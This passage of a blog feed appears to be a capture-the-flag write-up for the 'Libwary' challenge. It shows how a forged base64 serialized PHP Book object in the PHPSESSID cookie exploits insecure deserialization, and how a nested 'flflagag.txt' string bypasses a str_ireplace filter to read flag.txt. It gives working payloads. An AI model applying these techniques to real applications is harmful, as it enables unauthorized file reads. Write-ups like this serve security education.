<li><a href="https://www.php.net/manual/en/function.serialize.php">Serialization</a> generates a storable representation of PHP values, without losing their type and structure</li>
</ul>
<p>Now, looking at <code>util.php</code>, we see 2 classes defined: <code>Book</code> and <code>User</code>. Let&rsquo;s first focus on the Book class.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$titles</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;lovestory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;hackerstory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;eggstory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;castlestory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//bro thought he was cool by using classes for everything...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$option</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;titles&#39;</span><span class="p">][</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//if option was the flag, don&#39;t allow the user to read it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">==</span> <span class="mi">5</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//final defence
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//read the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//make it look nicer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>From here, we can see why selecting &ldquo;the flag&rdquo; doesn&rsquo;t work:</p>
<p>When an object with the class <code>Book</code> is first created (via <code>__construct()</code>), if we chose &ldquo;the flag&rdquo; as the book, it will be converted to &ldquo;fakeflag.txt&rdquo; instead.</p>
<p>It also has a final defence in <code>__tostring</code> (what is represented when the Book class is treated as a string), where it removes all occurences of &ldquo;flag&rdquo; in the name of the book chosen (unless it is &ldquo;fakeflag.txt&rdquo;).</p>
<p>Now moving on to the User class:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__tostring</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Not much to say, it just consists of a name. The <code>__tostring</code> method returns the name of the user. In this case, said <code>__tostring</code> method will be triggered at the following portion of the code (<code>echo</code> is similar to <code>print</code> in outputting data to the screen).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">        echo $user;
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>That is why our username is able to be dynamically displayed on the webpage.</p>
<p>So how can we solve this problem? The defences to prevent us from accessing &ldquo;flag.txt&rdquo; in <code>Book</code> all seem quite legit&hellip;</p>
<br>
<h3 id="controlling-the-cookie">Controlling the cookie</h3>
<p>Remember earlier where our username is determined from our cookie?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;User&#34;</span><span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(),</span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><figure>
  <img src="assets/libwary (2).png" width=70%>
  <figcaption style="text-align:center">The PHPSESSID cookie</figcaption>
</figure>
<p>Since we can control the value of the cookie, what if we decide to change the value of PHPSESSID?</p>
<ul>
<li>You can use extensions to change the value of the cookie (I am using <a href="https://cookie-editor.com/">Cookie-Editor</a>)</li>
</ul>
<br>
<p>Typing bogus values leads to the username not even being displayed. This is because we face a deserizaliation error.</p>
<figure>
  <img src="assets/libwary (3).png" width="70%">
  <figcaption style="text-align:center">Typing bogus values into the PHPSESSID cookie</figcaption>
</figure>
<figure>
  <img src="assets/libwary (7).png" width="90%">
  <figcaption style="text-align:center">When we try to unserialize bogus values, it will lead to an error</figcaption>
</figure>
<p>Thus, to change our username without throwing an error, we need to encode it the same way as how the cookie was encoded in the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
</span></span></code></pre></div><p>So, we need to encode it through <code>base64_encode(serialize(&lt;new_username&gt;))</code>. How about let&rsquo;s try encode the value &lsquo;hi&rsquo; as our username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="s1">&#39;hi&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Output: czoyOiJoaSI7
</span></span></span></code></pre></div><p>Changing our PHPSESSID cookie to the output, we get &lsquo;hi&rsquo; displayed as our username!</p>
<img src="assets/libwary (4).png">
<p>So, how can we exploit this to obtain the flag?</p>
<br>
<h3 id="php-insecure-deserialization">PHP Insecure Deserialization</h3>
<p>Considering we can control PHPSESSID to display whatever we want, how if we serialize an object with the class <code>Book</code>?</p>
<ul>
<li>Remember that serialization maintains the type and structure of the object!</li>
</ul>
<p>The class <code>Book</code> will return the content of the file when printed (as per its <code>__toString</code> method).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//final defence
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//read the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//make it look nicer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So, when it undergoes the following code, if <code>$user</code> is an object with the class <code>Book</code>, it would return the contents of its file!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">        echo $user;
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- this will return the contents of the file selected,
</span></span></span><span class="line"><span class="cl"><span class="c">    if the variable $user is an object of class Book--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>This is a potential vulnerability we can make use to print the contents &ldquo;flag.txt&rdquo;. We just need to serialize an object with the class <code>Book</code>, but make <code>$name = 'flag.txt'</code>.</p>
<br>
<h3 id="getting-flagtxt">Getting flag.txt</h3>
<p>We can simulate creating an object with the <code>Book</code> class by simply copy pasting the class and its variables from <code>util.php</code> to our own php compiler (or use <a href="https://onlinephp.io/">this</a> online sandbox).</p>
<p>We can then simply proceed to encode this object via the abovementioned serialization procedure.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span>
</span></span><span class="line"><span class="cl"><span class="c1">// we can serialize a Book object this way to then put into the cookie
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>Since we did not include a <code>__construct</code> method here, the value of <code>$option</code> doesn&rsquo;t determine the value of <code>$name</code>.</p>
<ul>
<li>When we serialize the <code>$Book</code> object ourselves, the values that are stored are 1) the class name and 2) its variables (ie <code>$option</code>,<code>$name</code>). The methods (eg <code>__construct</code>) will NOT be saved</li>
</ul>
<p>So, why don&rsquo;t we just fix <code>$name</code> to &ldquo;flag.txt&rdquo; by ourselves?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">;</span> <span class="c1">//fix $name to flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span> <span class="c1">// serialize the Book object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Output: Tzo0OiJCb29rIjozOntzOjY6Im9wdGlvbiI7TjtzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO3M6NzoiY29udGVudCI7Tjt9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>As such, we have successfully encoded an object which has <code>$name = &quot;flag.txt&quot;</code>.</p>
<p>However, this still wouldn&rsquo;t work due to the final defence in <code>__tostring</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//final defence [it will remove all occurrences of &#34;flag&#34; in $name]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//read the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//make it look nicer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>As such, when printing the object, <code>$name</code> will become <code>&quot;.txt&quot;</code> which leads to an error.</p>
<br>
<h3 id="bypassing-the-final-defence">Bypassing the final defence</h3>
<p>I went to google around for some bypasses of <code>str_ireplace</code> when I passed by <a href="https://www.sevenlayers.com/index.php/blog/398-hackmyvm-connection-walkthrough">this</a> article.</p>
<figure>
    <img src="assets/libwary (5).png" width=70%>
  <figcaption style="text-align:center">A screenshot from the website.</figcaption>
</figure>
<p>In the case of this image, the filtered terms are <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. To bypass the filter, the author embeds <code>&lt;script&gt;</code> in the middle of a <code>&lt;scr</code> and <code>ipt&gt;</code>, forming <code>&lt;scr&lt;script&gt;ipt&gt;</code>.</p>
<p>The filter will remove the <code>&lt;script&gt;</code> in the middle, which combines the <code>&lt;scr</code> and <code>ipt&gt;</code> fragments to form the filtered term!</p>
<br>
<p>Applying this, what we need to do is to put <code>$name = &quot;flflagag.txt&quot;</code>. This way, when the middle <code>&quot;flag&quot;</code> is removed, the 2 fragments at the side will form <code>&quot;flag.txt&quot;</code>!</p>
<p>Let&rsquo;s create a serialized <code>Book</code> object, this time with <code>$name = &quot;flflagag.txt&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;flflagag.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Output: Tzo0OiJCb29rIjozOntzOjY6Im9wdGlvbiI7TjtzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7czo3OiJjb250ZW50IjtOO30=
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>Let&rsquo;s change out cookie to the output. Reloading the page, we get the flag displayed at the location of the username.</p>
<img src="assets/libwary (6).png">
<p>Flag: <code>ACSI{0mg_th4nks_f0r_r3ading!} </code></p>
]]></content>
        </item>
        
    </channel>
</rss>
